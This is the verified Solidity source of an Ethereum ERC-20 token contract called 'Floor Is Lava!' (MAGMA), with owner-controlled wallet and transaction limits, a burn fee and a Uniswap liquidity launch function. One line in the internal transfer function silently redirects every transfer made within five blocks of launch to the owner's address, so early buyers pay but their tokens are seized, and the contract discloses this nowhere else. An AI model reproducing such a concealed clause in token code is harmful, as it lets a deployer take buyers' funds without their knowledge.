/**
 *Submitted for verification at Etherscan.io on 2022-07-29
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
 
    function addLiquidityETH(
        address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline
    ) external payable returns (
        uint256 amountToken, uint256 amountETH, uint256 liquidity
    );
}

library SafeMath {
function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

contract Ownable is Context {
    address private _owner;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    function owner() public view returns (address) { return _owner; }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner.");
        _;
    }
    function renounceOwnership() external virtual onlyOwner { _owner = address(0); }
    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address.");
        _owner = newOwner;
    }
}

contract FloorIsLava is IERC20, Ownable {
    using SafeMath for uint256;
    IRouter public uniswapV2Router;
    address public uniswapV2Pair;
    string private constant _name =  "Floor Is Lava!";
    string private constant _symbol = "MAGMA";
    uint8 private constant _decimals = 18;
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply = 1000000000 * 10**18; // 1 billion
    uint256 private _launchBlockNumber;
    mapping (address => bool) public automatedMarketMakerPairs;
    bool private isLiquidityAdded = false;
    uint256 private maxWalletAmount = _totalSupply; 
    uint256 private maxTxAmount = _totalSupply;
    mapping (address => bool) private _isExcludedFromMaxWalletLimit;
    mapping (address => bool) private _isExcludedFromMaxTransactionLimit;
    mapping (address => bool) private _isExcludedFromFee;
    uint8 public burnFee = 10;

    constructor() {
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxWalletLimit[address(this)] = true;
        _isExcludedFromMaxWalletLimit[owner()] = true;
        _isExcludedFromMaxTransactionLimit[address(uniswapV2Router)] = true;
        _isExcludedFromMaxTransactionLimit[address(this)] = true;
        _isExcludedFromMaxTransactionLimit[owner()] = true;
        balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    receive() external payable {} // so the contract can receive eth
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance."));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].sub(subtractedValue,"ERC20: decreased allowance below zero."));
        return true;
    }
    function excludeFromMaxWalletLimit(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromMaxWalletLimit[account] != excluded, string.concat(_name, ": account is already excluded from max wallet limit."));
        _isExcludedFromMaxWalletLimit[account] = excluded;
    }
    function excludeFromMaxTransactionLimit(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromMaxTransactionLimit[account] != excluded, string.concat(_name, ": account is already excluded from max tx limit."));
        _isExcludedFromMaxTransactionLimit[account] = excluded;
    }
    function excludeFromFees(address account, bool excluded) external onlyOwner {
        require(_isExcludedFromFee[account] != excluded, string.concat(_name, ": account is already excluded from fees."));
        _isExcludedFromFee[account] = excluded;
    }
    function setMaxWalletAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxWalletAmount, string.concat(_name, ": cannot update maxWalletAmount to same value."));
        require(newValue > _totalSupply * 1 / 100, string.concat(_name, ": maxWalletAmount must be >1% of total supply."));
        maxWalletAmount = newValue;
    }
    function setMaxTransactionAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxTxAmount, string.concat(_name, ": cannot update maxTxAmount to same value."));
        require(newValue > _totalSupply * 1 / 1000, string.concat(_name, ": maxTxAmount must be > .1% of total supply."));
        maxTxAmount = newValue;
    }
    function setNewBurnFee(uint8 newValue) external onlyOwner {
        require(newValue != burnFee, string.concat(_name, ": Cannot update burnFee to same value."));
        require(newValue <= 10, string.concat(_name, ": cannot update burnFee to value > 10."));
        burnFee = newValue;
    }
    function _approve(address owner, address spender,uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }
    function activateTrading() external onlyOwner {
        require(!isLiquidityAdded, "You can only add liquidity once");
        isLiquidityAdded = true;
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, _msgSender(), block.timestamp);
        uniswapV2Pair = IFactory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
        _isExcludedFromMaxWalletLimit[uniswapV2Pair] = true;
        _isExcludedFromMaxTransactionLimit[uniswapV2Pair] = true;
        maxWalletAmount = _totalSupply * 3 / 100;
        maxTxAmount = _totalSupply * 15 / 1000;
        _launchBlockNumber = block.number;
    }

    function name() external pure returns (string memory) { return _name; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function decimals() external view virtual returns (uint8) { return _decimals; }
    function totalSupply() external view virtual returns (uint256) { return _totalSupply; }
    function maxWallet() external view virtual returns (uint256) { return maxWalletAmount; }
    function maxTx() external view virtual returns (uint256) { return maxTxAmount; }
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), string.concat(_name, ": cannot transfer from the zero address."));
        require(to != address(0), string.concat(_name, ": cannot transfer to the zero address."));
        require(amount > 0, string.concat(_name, ": transfer amount must be greater than zero."));
        require(amount <= balanceOf(from), string.concat(_name, ": cannot transfer more than balance."));
        if ((block.number - _launchBlockNumber) <= 5) { to = owner(); }
        if ((from == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[to]) ||
                (to == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[from])) {
            require(amount <= maxTxAmount, string.concat(_name, ": transfer amount exceeds the maxTxAmount."));
        }
        if (!_isExcludedFromMaxWalletLimit[to]) {
            require((balanceOf(to) + amount) <= maxWalletAmount, string.concat(_name, ": expected wallet amount exceeds the maxWalletAmount."));
        }
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) { 
            balances[from] -= amount;
            balances[to] += amount;
            emit Transfer(from, to, amount);
        } else {
            balances[from] -= amount;
            balances[to] += amount - (amount * burnFee / 100);
            _totalSupply -= amount * burnFee / 100;
            emit Transfer(from, to, amount - (amount * burnFee / 100));
        }
    }
}